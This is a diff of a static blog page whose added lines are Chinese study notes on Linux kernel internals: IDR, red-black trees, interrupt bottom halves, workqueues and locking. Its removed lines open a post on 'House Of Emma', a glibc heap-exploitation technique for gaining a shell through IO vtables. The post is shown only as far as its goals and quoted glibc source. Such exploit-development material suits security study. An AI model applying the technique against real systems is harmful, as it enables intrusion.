+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span>                    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">hint</span>;</span>      <span class="comment">/* 最近一个存储指针数据的的idr_layer结构  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">top</span>;</span>       <span class="comment">/* idr的顶层(根节点) */</span></span><br><span class="line">    <span class="keyword">int</span>            layers;                <span class="comment">/* idr树中的idr_layer层数量 */</span></span><br><span class="line">    <span class="keyword">int</span>            cur;                   <span class="comment">/* current pos for cyclic allocation */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;                </span><br><span class="line">    <span class="keyword">int</span>            id_free_cnt;			<span class="comment">/* idr_layer空闲链表中剩余的idr_layer个数 */</span>            </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span>    *<span class="title">id_free</span>;</span>		<span class="comment">/* 指向idr_layer的空闲链表 */</span>        </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>struct idr 类似于 list_head，用于管理 IDR 整个树的信息</li>
+<li>其中最关键的是 top，它指向了根节点的 idr_layer</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>			prefix;                        <span class="comment">/* the ID prefix of this idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			layer;                        <span class="comment">/* 第几层 distance from leaf */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>	*<span class="title">ary</span>[1&lt;</span>&lt;IDR_BITS]; <span class="comment">/* IDR_BITS = 8 该层有256个指针,指向256个idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			count;                        <span class="comment">/* ary数组使用计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		DECLARE_BITMAP(bitmap, IDR_SIZE);	  <span class="comment">/* 槽位图 */</span>		</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>如图：</p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1660902016580.png" class width="1660836387459"> 
+<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1432802">linux内核IDR机制详解</a> </p>
+<p><strong>红黑树</strong></p>
+<p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
+<p>红黑规则：</p>
+<ul>
+<li>节点不是黑色，就是红色（非黑即红）</li>
+<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
+<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
+<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
+</ul>
+<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡：</p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1660902016580.png" class width="1655523602992"> 
+<h2 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h2><p>为了提高CPU和外围硬件（硬盘，键盘，鼠标等等）之间协同工作的性能，引入了中断的机制，中断机制是硬件在需要的时候向CPU发出信号，CPU暂时停止正在进行的工作，来处理硬件请求的一种机制</p>
+<ul>
+<li>异步中断（一般由硬件引起）：CPU 处理中断的时间过长，所以先将硬件复位，使硬件可以继续自己的工作，然后在适当时候处理中断请求中耗时的部分</li>
+<li>同步中断：CPU 处理完中断请求的所有工作后才反馈硬件 </li>
+</ul>
+<p>为了在中断执行时间尽可能短和中断处理需完成大量工作之间找到一个平衡点，Linux 将中断处理程序分解为两个半部：顶半部（top half）和底半部（bottom half）：</p>
+<ul>
+<li>顶半部完成尽可能少的比较紧急的功能，它往往只是 <strong>简单地读取寄存器中的中断状态并清除中断标志后就进行“登记中断”的工作</strong>（“登记中断”：将底半部处理程序挂到该设备的执行队列中去），这样，顶半部执行的速度就会很快，可以服务更多的中断请求</li>
+<li>现在，中断处理工作的重心就落在了底半部的头上，<strong>底半部负责执行中断处理程序</strong>，它来完成中断事件的绝大多数任务，而且可以被新的中断打断</li>
+<li>顶半部往往被设计成不可中断，底半部则相对来说并不是非常紧急的，而且相对比较耗时，不在硬件中断服务程序中执行，所以可以打断</li>
+</ul>
+<p>简单来说就是：</p>
+<ul>
+<li>顶半部：登记中断，把底半部处理程序挂到该设备的执行队列中，不可中断</li>
+<li>底半部：负责中断处理程序的具体实现，可中断</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425.png" class width="1660878766425"> 
+<p>实现底半部的方法很多，目前使用最多的是以下3中方法：</p>
+<ul>
+<li>软中断</li>
+<li>tasklet</li>
+<li>工作队列</li>
+</ul>
+<p><strong>软中断</strong></p>
+<p>软中断的流程如下： </p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533.png" class width="1660879056533"> 
+<p>注册软中断的函数 open_softirq：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_softirq</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">void</span> (*action)(struct softirq_action *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    softirq_vec[nr].action = action; <span class="comment">/* softirq_vec是个struct softirq_action类型的数组 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>将软中断类型和软中断处理函数加入到软中断序列中：</p>
+<ul>
+<li><p>@nr - 软中断类型</p>
+<ul>
+<li>@(<em>action)(struct softirq_action </em>) - 软中断处理的函数指针</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>结构体 softirq_action 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">softirq_action</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>    (*action)(struct softirq_action *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这个结构体的字段是个函数指针，字段名称是 action</li>
+<li>函数指针的参数是 struct softirq_action 的地址，其实就是指向 softirq_vec 中的某一项：<ul>
+<li>如果 open_softirq 是这样调用的：<code>open_softirq(NET_TX_SOFTIRQ, my_tx_action)</code></li>
+<li>那么 my_tx_action 的参数就是：<code>softirq_vec[NET_TX_SOFTIRQ]</code> 的地址</li>
+</ul>
+</li>
+</ul>
+<p>触发软中断的函数 raise_softirq：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raise_softirq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags); <span class="comment">/* 保存寄存器 */</span></span><br><span class="line">    raise_softirq_irqoff(nr); <span class="comment">/* 触发软中断 */</span></span><br><span class="line">    local_irq_restore(flags); <span class="comment">/* 恢复寄存器 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>触发某个中断类型的软中断：<ul>
+<li>@nr - 被触发的中断类型</li>
+</ul>
+</li>
+</ul>
+<p>执行软中断的函数 do_softirq：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">void</span> <span class="title">do_softirq</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断是否在中断处理中，如果正在中断处理，就直接返回 */</span></span><br><span class="line">    <span class="keyword">if</span> (in_interrupt())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 保存当前寄存器的值 */</span></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 取得当前已注册软中断的位图 */</span></span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 循环处理所有已注册的软中断 */</span></span><br><span class="line">    <span class="keyword">if</span> (pending)</span><br><span class="line">        __do_softirq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复寄存器的值到中断处理前 */</span></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>tasklet</strong></p>
+<p>tasklet 也是利用软中断来实现的，但是它提供了比软中断更好用的接口（其实就是基于软中断又封装了一下）</p>
+<ul>
+<li>所以除了对性能要求特别高的情况，一般建议使用 tasklet 来实现自己的中断</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表中的下一个tasklet */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> state;         <span class="comment">/* tasklet状态 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;              <span class="comment">/* 引用计数器 */</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>); <span class="comment">/* tasklet处理函数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;          <span class="comment">/* tasklet处理函数的参数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>工作队列</strong></p>
+<p>工作队列子系统是一个 <strong>用于创建内核线程的接口</strong> ，通过它可以创建一个 [工作者线程] 来专门处理中断的下半部工作</p>
+<ul>
+<li>工作队列和 tasklet 不一样，不是基于软中断来实现的</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270.png" class width="1660882969270"> 
+<p>工作队列主要用到下面3个结构体，弄懂了这3个结构体的关系，也就知道工作队列的处理流程了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在include/linux/workqueue.h文件中定义 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;             <span class="comment">/* 这个并不是处理函数的参数,而是表示此work是否pending等状态的flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_PENDING 0        <span class="comment">/* T if work item pending execution */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_FLAG_MASK (3UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_WQ_DATA_MASK (~WORK_STRUCT_FLAG_MASK)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span>         <span class="comment">/* 中断下半部处理函数的链表 */</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;               <span class="comment">/* 处理中断下半部工作的函数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在kernel/workqueue.c文件中定义</span></span><br><span class="line"><span class="comment"> * 每个工作者线程对应一个cpu_workqueue_struct,其中包含要处理的工作的链表</span></span><br><span class="line"><span class="comment"> * (即work_struct的链表,当此链表不空时,唤醒工作者线程来进行处理)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;                   <span class="comment">/* 锁保护这种结构 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">worklist</span>;</span>         <span class="comment">/* 工作队列头节点 */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> more_work;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> *<span class="title">current_work</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> *<span class="title">wq</span>;</span>       <span class="comment">/* 关联工作队列结构 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">thread</span>;</span>        <span class="comment">/* 关联线程 */</span></span><br><span class="line">&#125; ____cacheline_aligned;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 也是在kernel/workqueue.c文件中定义的</span></span><br><span class="line"><span class="comment"> * 每个workqueue_struct表示一种工作者类型,系统默认的就是events工作者类型</span></span><br><span class="line"><span class="comment"> * 每个工作者类型一般对应n个工作者线程,n就是处理器的个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> *<span class="title">cpu_wq</span>;</span>  <span class="comment">/* 工作者线程 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> singlethread;</span><br><span class="line">    <span class="keyword">int</span> freezeable;        <span class="comment">/* Freeze threads during suspend */</span></span><br><span class="line">    <span class="keyword">int</span> rt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="内核同步"><a href="#内核同步" class="headerlink" title="内核同步"></a>内核同步</h2><p>存在共享资源（共享一个文件，一块内存等等）的时候，为了防止并发访问时共享资源的数据不一致，引入了同步机制</p>
+<p>所谓同步，其实防止在临界区中形成竞争条件：</p>
+<ul>
+<li>临界区 - 也称为临界段，就是访问和操作共享数据的代码段</li>
+<li>竞争条件 - 2个或2个以上线程在临界区里同时执行的时候，就构成了竞争条件</li>
+</ul>
+<p>内核同步常见方法如下：</p>
+<p><strong>原子操作</strong></p>
+<p>原子操作是由编译器来保证的，保证一个线程对数据的操作不会被其他线程打断</p>
+<ul>
+<li>所谓原子操作是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch</li>
+</ul>
+<p><strong>加锁</strong></p>
+<p>为了给临界区加锁，保证临界区数据的同步，首先了解一下内核中哪些情况下会产生并发 </p>
+<p>内核中造成竞争条件的原因：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>竞争原因</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>中断</td>
+<td>中断随时会发生，也就会随时打断当前执行的代码，如果中断和被打断的代码在相同的临界区，就产生了竞争条件</td>
+</tr>
+<tr>
+<td>软中断和tasklet</td>
+<td>软中断和 tasklet 也会随时被内核唤醒执行，也会像中断一样打断正在执行的代码</td>
+</tr>
+<tr>
+<td>内核抢占</td>
+<td>内核具有抢占性，发生抢占时，如果抢占的线程和被抢占的线程在相同的临界区，就产生了竞争条件</td>
+</tr>
+<tr>
+<td>睡眠及用户空间的同步</td>
+<td>用户进程睡眠后，调度程序会唤醒一个新的用户进程，新的用户进程和睡眠的进程可能在同一个临界区中</td>
+</tr>
+<tr>
+<td>对称多处理</td>
+<td>2个或多个处理器可以同时执行相同的代码</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>常见的锁有以下几类：</p>
+<ul>
+<li>自旋锁：当一个线程获取了锁之后，其他试图获取这个锁的线程一直在循环等待获取这个锁，直至锁重新可用（由于线程实在一直循环的获取这个锁，所以会造成CPU处理时间的浪费，因此最好将自旋锁用于能很快处理完的临界区）</li>
+<li>互斥锁：互斥锁也是一种可以睡眠的锁，相当于二值信号量，只是提供的API更加简单，使用的场景也更严格一些 </li>
+</ul>
+<p><strong>信号量</strong></p>
+<p>信号量也是一种锁，和自旋锁不同的是，进程获取不到信号量的时候，不会像自旋锁一样循环的去试图获取锁，而是进入睡眠（进入等待队列），直至有信号量释放出来时，才会唤醒睡眠的进程，进入临界区执行</p>
+<p>信号量结构体具体如下： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        count; <span class="comment">/* 信号量计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">wait_list</span>;</span> <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>其实信号量就相当于一个 [常数] 加上一个 [等待队列]：</p>
+<ul>
+<li>[常数] &gt; 0：代表了当前临界区可以容纳的进程个数</li>
+<li>[常数] = 0：争用信号量的进程会进入睡眠（进入等待队列）</li>
+<li>[常数] &lt; 0：在等待队列中的进程数目</li>
+</ul>
+<p>当一个进程进入临界区时，会先检查该临界区的 <code>semaphore-&gt;count</code>：</p>
+<ul>
+<li>如果大于“0”就进入该临界区，同时 <code>semaphore-&gt;count--</code></li>
+<li>如果小于等于“0”就进入 <code>semaphore-&gt;wait_list</code>，同时 <code>semaphore-&gt;count--</code></li>
+</ul>
+<p>当一个进程离开临界区时，也会检查该临界区的 <code>semaphore-&gt;count</code>：</p>
+<ul>
+<li>如果小于“0”就把 <code>semaphore-&gt;wait_list</code> 中的一个进程放入临界区，同时 <code>semaphore-&gt;count++</code></li>
+<li>如果大于等于“0”，只执行 <code>semaphore-&gt;count++</code> 就可以了</li>
+</ul>
+<p><strong>完成变量</strong></p>
+<p>完成变量的机制类似于信号量，比如一个线程A进入临界区之后，另一个线程B会在完成变量上等待，线程A完成了任务出了临界区之后，使用完成变量来唤醒线程B</p>
+<ul>
+<li>如果在内核中一个任务需要发出信号通知另一任务发生了某个特定事件，利用完成变量（completion variable）是使两个任务得以同步的简单方法</li>
+<li>如果一个任务要执行一些工作时，另一个任务就会在完成变量上等待</li>
+</ul>
+<p><strong>同步方法选择</strong></p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527.png" class width="1660900515527"> 
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1602,386 +2276,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/07/House%20Of%20Emma-%E5%8E%9F%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/07/House%20Of%20Emma-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Emma-原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-08-07 11:45:44" itemprop="dateCreated datePublished" datetime="2022-08-07T11:45:44+08:00">2022-08-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-08 13:10:14" itemprop="dateModified" datetime="2022-08-08T13:10:14+08:00">2022-08-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>9.9k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>9 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="House-Of-Emma"><a href="#House-Of-Emma" class="headerlink" title="House Of Emma"></a>House Of Emma</h2><p>在 libc-2.34 版本中，常用的 hook 都被 ban 掉了（malloc_hook，free_hook 等），我们要尝试通过控制 IO 来获取 shell</p>
-<p>应用场景是：</p>
-<ul>
-<li>可以任意写一个可控地址（LargeBin Attack，Tcache Stashing Unlink Attack）</li>
-<li>可以触发 IO 流（FSOP，House Of Kiwi）</li>
-</ul>
-<hr>
-<h2 id="House-Of-Emma-原理"><a href="#House-Of-Emma-原理" class="headerlink" title="House Of Emma 原理"></a>House Of Emma 原理</h2><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps（vtable 的一部分）：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>以下这几个函数内存在任意函数指针调用：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE 